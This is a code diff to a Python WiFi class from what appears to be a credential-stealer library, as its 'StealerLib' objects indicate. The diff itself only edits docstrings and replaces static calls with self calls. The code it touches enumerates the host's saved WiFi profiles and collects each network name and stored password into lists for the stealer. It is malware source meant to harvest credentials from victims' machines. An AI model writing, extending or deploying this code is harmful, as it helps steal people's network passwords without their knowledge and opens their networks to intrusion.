@@ -31,7 +31,7 @@ class WiFi:
 
     @staticmethod
     def get_wifi_profiles() -> list:
-        """Retrieves all wifi profiles from the system -- Not implemented into get_wifi_passwords yet
+        """Retrieves all wifi profiles from the system
 
         Returns:
             list: A list of all available WiFi profile names
@@ -49,7 +49,7 @@ class WiFi:
 
     @staticmethod
     def get_profile_info(profile: str) -> list:
-        """Retrieves wifi profile information for a given profile name -- Not implemented into get_wifi_passwords yet
+        """Retrieves wifi profile information for a given profile name
 
         Parameters:
             profile (str): The name of the WiFi profile to look up
@@ -77,21 +77,21 @@ class WiFi:
 
         Parameters:
             self (object): The object passed to the method
-            conv (bool): Whether to return the data as a list of information or a StealerLib object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
-            list: A list of WiFi logins appended as a list of values or StealerLib objects
+            list: A list of WiFi login information, stored in another list or a StealerLib object
 
         Example:
             network = WiFi()
-            network.get_passwords()
+            network.get_wifi_passwords()
         """
 
-        profiles = WiFi.get_wifi_profiles()
+        profiles = self.get_wifi_profiles()
 
         for profile in profiles:
             try:
-                profile_info = WiFi.get_profile_info(profile)
+                profile_info = self.get_profile_info(profile)
 
                 try:
                     password = profile_info[0]
@@ -104,6 +104,7 @@ class WiFi:
 
             self.ssids.append(obj_ssid.profile)
             self.passwords.append(obj_ssid.password)
+
             self.credentials.append(
                 obj_ssid.conv() if conv else obj_ssid
             )
